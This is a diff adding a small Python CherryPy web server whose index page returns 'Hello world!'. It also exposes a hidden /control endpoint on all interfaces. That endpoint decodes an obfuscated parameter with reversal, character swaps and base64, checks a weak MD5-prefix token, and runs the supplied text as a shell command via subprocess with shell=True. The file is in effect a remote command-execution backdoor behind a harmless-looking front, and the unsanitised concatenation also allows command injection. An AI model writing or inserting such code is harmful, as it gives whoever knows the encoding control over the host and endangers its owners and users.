@@ -1,0 +1,36 @@
+import cherrypy
+import string 
+import base64
+import hashlib
+import subprocess
+conf = {'global': {'server.socket_host': '0.0.0.0','server.socket_port': 10200}} 
+class HelloWorld:
+   def decoderinfo(self,s1):
+      s1 = s1[::-1]
+      s1 = string.replace(s1,'^',"=")
+      s1 = string.replace(s1,'!',"a")
+      s1 = string.replace(s1,'(',"c")
+      s1 = string.replace(s1,')',"f")
+      s1 = string.replace(s1,'$',"m")
+      s1 = string.replace(s1,'*',"x")
+      res_de = base64.decodestring(s1)
+      return res_de
+   @cherrypy.expose
+   def control(self,code):
+      strs = self.decoderinfo(code)
+      cmds = strs.split("$:::$")
+      #return cmds
+      #if cmds[0][0:5] == hashlib.md5(cmds).hexdigest()[1:6]
+      #return cmds[0] 
+      if cmds[0][0:5] ==  hashlib.md5(cmds[3]).hexdigest()[1:6]:
+             cmd = "./libs/" + cmds[1].replace(':::', ' ')
+             execproc = subprocess.Popen(cmd, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+             return cmd
+      else:
+          return "failure"
+   @cherrypy.expose
+   def index(self):
+      return "Hello world!"
+   index.exposed = True
+cherrypy.config.update(conf)
+cherrypy.quickstart(HelloWorld())
